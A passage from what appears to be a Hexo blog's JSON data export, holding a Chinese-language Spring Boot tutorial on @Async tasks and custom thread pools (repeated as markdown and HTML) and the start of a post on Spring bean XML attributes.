+ ex.getMessage());\n        }\n\n    }\n\n}\n\n```\n\n###### 2.获取异步任务的返回结果\n\n```\n/**\n * 要执行的异步任务\n */\n@Component\npublic class AsyncDoThings {\n\n    public void doThing1() throws Exception{\n        System.out.println(\"[*] doThing1 Start : \" + System.currentTimeMillis());\n        System.out.println(\"[*] threadname \" + Thread.currentThread().getName() );\n        Thread.sleep(1000);\n        System.out.println(\"[*] doThing1 end: \" + System.currentTimeMillis());\n    }\n\n    @Async\n    public void AsyncDoThing1() throws Exception{\n        System.out.println(\"[*] AsyncDoThing1 Start : \" + System.currentTimeMillis());\n        System.out.println(\"[*] threadname \" + Thread.currentThread().getName() );\n        Thread.sleep(3000);\n        System.out.println(\"[*] AsyncDoThing1 end: \" + System.currentTimeMillis());\n    }\n\n    //获取返回结果\n    @Async\n    public Future<String> AsyncWithResponse(String tips) throws Exception{\n        System.out.println(\"[*] AsyncWithResponse Start : \" + System.currentTimeMillis());\n        System.out.println(\"[*] threadname \" + Thread.currentThread().getName() );\n        Thread.sleep(3000);\n        System.out.println(\"[*] AsyncWithResponse end: \" + System.currentTimeMillis());\n        return new AsyncResult<>(tips + \" : finished! \");\n    }\n}\n\n//测试类中\n@Test\npublic void contextLoads() throws Exception{\n    asyncDoThings.doThing1();\n    asyncDoThings.AsyncDoThing1();\n    asyncDoThings.doThing1();\n\n    Future future = asyncDoThings.AsyncWithResponse(\"AsyncWithRes \");\n    System.out.println(\"[*]: \"  + Thread.currentThread().getName() + \" \" + future.get());\n}\n```\n\n###### 3.结果\n![Async2](http://67.216.218.49:8000/file/blogs/java/spring/Async2.png)\n","slug":"java/spring/springAsync","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ln004i6dcpyo93fsxb","content":"<h3 id=\"1-快速上手\"><a href=\"#1-快速上手\" class=\"headerlink\" title=\"1.快速上手\"></a>1.快速上手</h3><h6 id=\"1-添加-EnableAsync\"><a href=\"#1-添加-EnableAsync\" class=\"headerlink\" title=\"1.添加@EnableAsync\"></a>1.添加@EnableAsync</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Configuration</span><br><span class=\"line\">@EnableAsync</span><br><span class=\"line\">public class AsyncConfig &#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"2-异步方法\"><a href=\"#2-异步方法\" class=\"headerlink\" title=\"2.异步方法\"></a>2.异步方法</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * 要执行的异步任务</span><br><span class=\"line\"> */</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class AsyncDoThings &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void doThing1() throws Exception&#123;</span><br><span class=\"line\">        System.out.println(&quot;[*] doThing1 Start : &quot; + System.currentTimeMillis());</span><br><span class=\"line\">        Thread.sleep(10000);</span><br><span class=\"line\">        System.out.println(&quot;[*] doThing1 end: &quot; + System.currentTimeMillis());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Async</span><br><span class=\"line\">    public void AsyncDoThing1() throws Exception&#123;</span><br><span class=\"line\">        System.out.println(&quot;[*] AsyncDoThing1 Start : &quot; + System.currentTimeMillis());</span><br><span class=\"line\">        Thread.sleep(10000);</span><br><span class=\"line\">        System.out.println(&quot;[*] AsyncDoThing1 end: &quot; + System.currentTimeMillis());</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-执行\"><a href=\"#3-执行\" class=\"headerlink\" title=\"3.执行\"></a>3.执行</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@RunWith(SpringRunner.class)</span><br><span class=\"line\">@SpringBootTest</span><br><span class=\"line\">public class SpringbootDemoApplicationTests &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    AsyncDoThings asyncDoThings;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Test</span><br><span class=\"line\">    public void contextLoads() throws Exception&#123;</span><br><span class=\"line\">        asyncDoThings.doThing1();</span><br><span class=\"line\">        asyncDoThings.AsyncDoThing1();</span><br><span class=\"line\">        asyncDoThings.doThing1();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"4-结果\"><a href=\"#4-结果\" class=\"headerlink\" title=\"4.结果\"></a>4.结果</h6><p>可以看到  异步任务 开始后，下一个任务立即执行，未发生阻塞等待<br><br><img src=\"http://67.216.218.49:8000/file/blogs/java/spring/Async1.png\" alt=\"Async1\"></p>\n<h3 id=\"2-稍微深入\"><a href=\"#2-稍微深入\" class=\"headerlink\" title=\"2.稍微深入\"></a>2.稍微深入</h3><h6 id=\"1-使用自己的线程池\"><a href=\"#1-使用自己的线程池\" class=\"headerlink\" title=\"1.使用自己的线程池\"></a>1.使用自己的线程池</h6><p>实现AsyncConfiguer接口<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * 异步任务配置类</span><br><span class=\"line\"> */</span><br><span class=\"line\">@Configuration</span><br><span class=\"line\">@EnableAsync</span><br><span class=\"line\">public class AsyncConfig implements AsyncConfigurer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 使用自己的线程池</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public Executor getAsyncExecutor()&#123;</span><br><span class=\"line\">        ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor();</span><br><span class=\"line\">        executor.setCorePoolSize(5);</span><br><span class=\"line\">        executor.setMaxPoolSize(20);</span><br><span class=\"line\">        executor.setQueueCapacity(200);</span><br><span class=\"line\">        executor.setKeepAliveSeconds(60*30);</span><br><span class=\"line\">        //等待任务在关机时完成--表明等待所有线程执行完</span><br><span class=\"line\">        executor.setWaitForTasksToCompleteOnShutdown(true);</span><br><span class=\"line\">        //线程名前缀</span><br><span class=\"line\">        executor.setThreadNamePrefix(&quot;MyAsync-&quot;);</span><br><span class=\"line\">        executor.initialize();</span><br><span class=\"line\">        return executor;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 处理异步任务中发生的异常</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public AsyncUncaughtExceptionHandler getAsyncUncaughtExceptionHandler()&#123;</span><br><span class=\"line\">        //return new AsyncExecuteExceptionHandler();</span><br><span class=\"line\">        return new SimpleAsyncUncaughtExceptionHandler();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class AsyncExecuteExceptionHandler implements AsyncUncaughtExceptionHandler&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void handleUncaughtException(Throwable ex, Method method, Object... params)&#123;</span><br><span class=\"line\">            System.out.println(&quot;[*]: 异步任务发生异常 &quot; + ex.getMessage());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"2-获取异步任务的返回结果\"><a href=\"#2-获取异步任务的返回结果\" class=\"headerlink\" title=\"2.获取异步任务的返回结果\"></a>2.获取异步任务的返回结果</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * 要执行的异步任务</span><br><span class=\"line\"> */</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class AsyncDoThings &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void doThing1() throws Exception&#123;</span><br><span class=\"line\">        System.out.println(&quot;[*] doThing1 Start : &quot; + System.currentTimeMillis());</span><br><span class=\"line\">        System.out.println(&quot;[*] threadname &quot; + Thread.currentThread().getName() );</span><br><span class=\"line\">        Thread.sleep(1000);</span><br><span class=\"line\">        System.out.println(&quot;[*] doThing1 end: &quot; + System.currentTimeMillis());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Async</span><br><span class=\"line\">    public void AsyncDoThing1() throws Exception&#123;</span><br><span class=\"line\">        System.out.println(&quot;[*] AsyncDoThing1 Start : &quot; + System.currentTimeMillis());</span><br><span class=\"line\">        System.out.println(&quot;[*] threadname &quot; + Thread.currentThread().getName() );</span><br><span class=\"line\">        Thread.sleep(3000);</span><br><span class=\"line\">        System.out.println(&quot;[*] AsyncDoThing1 end: &quot; + System.currentTimeMillis());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取返回结果</span><br><span class=\"line\">    @Async</span><br><span class=\"line\">    public Future&lt;String&gt; AsyncWithResponse(String tips) throws Exception&#123;</span><br><span class=\"line\">        System.out.println(&quot;[*] AsyncWithResponse Start : &quot; + System.currentTimeMillis());</span><br><span class=\"line\">        System.out.println(&quot;[*] threadname &quot; + Thread.currentThread().getName() );</span><br><span class=\"line\">        Thread.sleep(3000);</span><br><span class=\"line\">        System.out.println(&quot;[*] AsyncWithResponse end: &quot; + System.currentTimeMillis());</span><br><span class=\"line\">        return new AsyncResult&lt;&gt;(tips + &quot; : finished! &quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//测试类中</span><br><span class=\"line\">@Test</span><br><span class=\"line\">public void contextLoads() throws Exception&#123;</span><br><span class=\"line\">    asyncDoThings.doThing1();</span><br><span class=\"line\">    asyncDoThings.AsyncDoThing1();</span><br><span class=\"line\">    asyncDoThings.doThing1();</span><br><span class=\"line\"></span><br><span class=\"line\">    Future future = asyncDoThings.AsyncWithResponse(&quot;AsyncWithRes &quot;);</span><br><span class=\"line\">    System.out.println(&quot;[*]: &quot;  + Thread.currentThread().getName() + &quot; &quot; + future.get());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-结果\"><a href=\"#3-结果\" class=\"headerlink\" title=\"3.结果\"></a>3.结果</h6><p><img src=\"http://67.216.218.49:8000/file/blogs/java/spring/Async2.png\" alt=\"Async2\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1-快速上手\"><a href=\"#1-快速上手\" class=\"headerlink\" title=\"1.快速上手\"></a>1.快速上手</h3><h6 id=\"1-添加-EnableAsync\"><a href=\"#1-添加-EnableAsync\" class=\"headerlink\" title=\"1.添加@EnableAsync\"></a>1.添加@EnableAsync</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Configuration</span><br><span class=\"line\">@EnableAsync</span><br><span class=\"line\">public class AsyncConfig &#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"2-异步方法\"><a href=\"#2-异步方法\" class=\"headerlink\" title=\"2.异步方法\"></a>2.异步方法</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * 要执行的异步任务</span><br><span class=\"line\"> */</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class AsyncDoThings &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void doThing1() throws Exception&#123;</span><br><span class=\"line\">        System.out.println(&quot;[*] doThing1 Start : &quot; + System.currentTimeMillis());</span><br><span class=\"line\">        Thread.sleep(10000);</span><br><span class=\"line\">        System.out.println(&quot;[*] doThing1 end: &quot; + System.currentTimeMillis());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Async</span><br><span class=\"line\">    public void AsyncDoThing1() throws Exception&#123;</span><br><span class=\"line\">        System.out.println(&quot;[*] AsyncDoThing1 Start : &quot; + System.currentTimeMillis());</span><br><span class=\"line\">        Thread.sleep(10000);</span><br><span class=\"line\">        System.out.println(&quot;[*] AsyncDoThing1 end: &quot; + System.currentTimeMillis());</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-执行\"><a href=\"#3-执行\" class=\"headerlink\" title=\"3.执行\"></a>3.执行</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@RunWith(SpringRunner.class)</span><br><span class=\"line\">@SpringBootTest</span><br><span class=\"line\">public class SpringbootDemoApplicationTests &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    AsyncDoThings asyncDoThings;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Test</span><br><span class=\"line\">    public void contextLoads() throws Exception&#123;</span><br><span class=\"line\">        asyncDoThings.doThing1();</span><br><span class=\"line\">        asyncDoThings.AsyncDoThing1();</span><br><span class=\"line\">        asyncDoThings.doThing1();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"4-结果\"><a href=\"#4-结果\" class=\"headerlink\" title=\"4.结果\"></a>4.结果</h6><p>可以看到  异步任务 开始后，下一个任务立即执行，未发生阻塞等待<br><br><img src=\"http://67.216.218.49:8000/file/blogs/java/spring/Async1.png\" alt=\"Async1\"></p>\n<h3 id=\"2-稍微深入\"><a href=\"#2-稍微深入\" class=\"headerlink\" title=\"2.稍微深入\"></a>2.稍微深入</h3><h6 id=\"1-使用自己的线程池\"><a href=\"#1-使用自己的线程池\" class=\"headerlink\" title=\"1.使用自己的线程池\"></a>1.使用自己的线程池</h6><p>实现AsyncConfiguer接口<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * 异步任务配置类</span><br><span class=\"line\"> */</span><br><span class=\"line\">@Configuration</span><br><span class=\"line\">@EnableAsync</span><br><span class=\"line\">public class AsyncConfig implements AsyncConfigurer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 使用自己的线程池</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public Executor getAsyncExecutor()&#123;</span><br><span class=\"line\">        ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor();</span><br><span class=\"line\">        executor.setCorePoolSize(5);</span><br><span class=\"line\">        executor.setMaxPoolSize(20);</span><br><span class=\"line\">        executor.setQueueCapacity(200);</span><br><span class=\"line\">        executor.setKeepAliveSeconds(60*30);</span><br><span class=\"line\">        //等待任务在关机时完成--表明等待所有线程执行完</span><br><span class=\"line\">        executor.setWaitForTasksToCompleteOnShutdown(true);</span><br><span class=\"line\">        //线程名前缀</span><br><span class=\"line\">        executor.setThreadNamePrefix(&quot;MyAsync-&quot;);</span><br><span class=\"line\">        executor.initialize();</span><br><span class=\"line\">        return executor;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 处理异步任务中发生的异常</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public AsyncUncaughtExceptionHandler getAsyncUncaughtExceptionHandler()&#123;</span><br><span class=\"line\">        //return new AsyncExecuteExceptionHandler();</span><br><span class=\"line\">        return new SimpleAsyncUncaughtExceptionHandler();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class AsyncExecuteExceptionHandler implements AsyncUncaughtExceptionHandler&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void handleUncaughtException(Throwable ex, Method method, Object... params)&#123;</span><br><span class=\"line\">            System.out.println(&quot;[*]: 异步任务发生异常 &quot; + ex.getMessage());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"2-获取异步任务的返回结果\"><a href=\"#2-获取异步任务的返回结果\" class=\"headerlink\" title=\"2.获取异步任务的返回结果\"></a>2.获取异步任务的返回结果</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * 要执行的异步任务</span><br><span class=\"line\"> */</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class AsyncDoThings &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void doThing1() throws Exception&#123;</span><br><span class=\"line\">        System.out.println(&quot;[*] doThing1 Start : &quot; + System.currentTimeMillis());</span><br><span class=\"line\">        System.out.println(&quot;[*] threadname &quot; + Thread.currentThread().getName() );</span><br><span class=\"line\">        Thread.sleep(1000);</span><br><span class=\"line\">        System.out.println(&quot;[*] doThing1 end: &quot; + System.currentTimeMillis());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Async</span><br><span class=\"line\">    public void AsyncDoThing1() throws Exception&#123;</span><br><span class=\"line\">        System.out.println(&quot;[*] AsyncDoThing1 Start : &quot; + System.currentTimeMillis());</span><br><span class=\"line\">        System.out.println(&quot;[*] threadname &quot; + Thread.currentThread().getName() );</span><br><span class=\"line\">        Thread.sleep(3000);</span><br><span class=\"line\">        System.out.println(&quot;[*] AsyncDoThing1 end: &quot; + System.currentTimeMillis());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取返回结果</span><br><span class=\"line\">    @Async</span><br><span class=\"line\">    public Future&lt;String&gt; AsyncWithResponse(String tips) throws Exception&#123;</span><br><span class=\"line\">        System.out.println(&quot;[*] AsyncWithResponse Start : &quot; + System.currentTimeMillis());</span><br><span class=\"line\">        System.out.println(&quot;[*] threadname &quot; + Thread.currentThread().getName() );</span><br><span class=\"line\">        Thread.sleep(3000);</span><br><span class=\"line\">        System.out.println(&quot;[*] AsyncWithResponse end: &quot; + System.currentTimeMillis());</span><br><span class=\"line\">        return new AsyncResult&lt;&gt;(tips + &quot; : finished! &quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//测试类中</span><br><span class=\"line\">@Test</span><br><span class=\"line\">public void contextLoads() throws Exception&#123;</span><br><span class=\"line\">    asyncDoThings.doThing1();</span><br><span class=\"line\">    asyncDoThings.AsyncDoThing1();</span><br><span class=\"line\">    asyncDoThings.doThing1();</span><br><span class=\"line\"></span><br><span class=\"line\">    Future future = asyncDoThings.AsyncWithResponse(&quot;AsyncWithRes &quot;);</span><br><span class=\"line\">    System.out.println(&quot;[*]: &quot;  + Thread.currentThread().getName() + &quot; &quot; + future.get());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-结果\"><a href=\"#3-结果\" class=\"headerlink\" title=\"3.结果\"></a>3.结果</h6><p><img src=\"http://67.216.218.49:8000/file/blogs/java/spring/Async2.png\" alt=\"Async2\"></p>\n"},{"title":"spring基础一 bean","date":"2019-06-23T04:58:44.000Z","_content":"\n\n### 1.Bean的属性\nbean的 .xml 文件<br>\n```\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxsi:schemaLocation=\"\nhttp://www.springframework.org/schema/beans\nhttp://www.springframework.org/schema/beans/spring-beans.xsd\">\n\n<!-- 自己的bean -->\n<bean></bean>\n\n</beans>\n```\n将bean交给spring:\n```\n@ImportResource(locations = {\"classpath:xxxx.xml\"})\n```\n###### (1).自身属性\n\n\n- id\n\nid为bean的唯一标识名，也就是beanName.\n```\n<bean id=\"userEntity\" class=\"com.bonc.apimanage.test.UserEntity\">\n      <!-- 通过setter注入属性值 -->\n       <property name=\"id\" value=\"123\"></property>\n</bean>\n\n<bean id=\"userService\" class=\"com.bonc.apimanage.test.UserService\">\n    <!-- 注入 userEntity 属性对象 -->\n    <property name=\"userService\" ref=\"userEntity\"></property>\n</bean>\n```\n\n- name\n\nbean的别名。\n\n- class\n\nbean的类。子类bean不用定义该属性。\n\n- parent\n\n子类Bean定义它所引用它的父类Bean。这时class属性失效。子类Bean会继承父类Bean的所有属性，子类Bean也可以覆盖父类Bean的属性。注意：子类Bean和父类Bean是同一个Java类\n\n- abstract\n\n默认为”false”，用来定义Bean是否为抽象Bean。它表示这个Bean将不会被实例化，一般用于父类Bean，因为父类Bean主要是供子类Bean继承使用。\n\n- scope\n\n默认为singleton（单例）<br>\n\nprototype（原型）状态，BeanFactory将为每次Bean请求创建一个新的Bean实例。<br>\nsession：创建对象把创建的对象放到session域里面去<br>\nrequest：创建对象把创建的对象放到request域里面去<br>\nglobalsession：创建对象把创建的对象放到globalsession域里面去<br>\n\n- lazy-init\n\n用来定义这个Bean是否实现懒初始化<br>\n默认为 default  <br>\n如果为 true ，它将在BeanFactory启动时初始化所有的SingletonBean<br>\n如果为 false ,它只在Bean请求时才开始创建SingletonBean。\n\n- autowire\n\n它定义了Bean的自动装载方式<br>\nno :不使用自动装配功能<br>\nbyName :通过Bean的属性名实现自动装配<br>\nbyType :通过Bean的类型实现自动装配<br>\nconstructor :类似于byType，但它是用于构造函数的参数的自动组装<br>\ndefault：默认值，自动装配\n\n\n- depends-on\n\nBean在初始化时依赖的对象，这个对象会在这个Bean初始化之前创建<br>\n可以用来控制bean初始化顺序\n\n- init-method\n\n用来定义Bean的初始化方法，它会在Bean组装之后调用。它必须是一个无参数的方法\n\n- destory-method\n\n用来定义Bean的销毁方法，它在 BeanFactory 关闭时调用。同样，它也必须是一个无参数的方法。它只能应用于 singletonBean。\n\n- factory-method\n\n定义创建该Bean对象的工厂方法。它用于下面的 factory-bean ，表示这个Bean是通过工厂方法创建。此时， class 属性失效\n\n- factory-bean\n\n定义创建该 Bean 对象的工厂类。如果使用了 factory-bean 则 class 属性失效\n\n###### (2).子属性\n\n- meta\n\n元数据。当需要使用里面的信息时可以通过key获取<br>\nmeta 所声明的 key 并不会在 Bean 中体现，只是一个额外的声明，当我们需要使用里面的信息时，通过 BeanDefinition 的 getAttribute() 获取<br>\n\n- lookup-method\n\n获取器注入，是把一个方法声明为返回某种类型的 bean 但实际要返回的 bean 是在配置文件里面配置的。该方法可以用于设计一些可插拔的功能上，解除程序依赖\n\n- 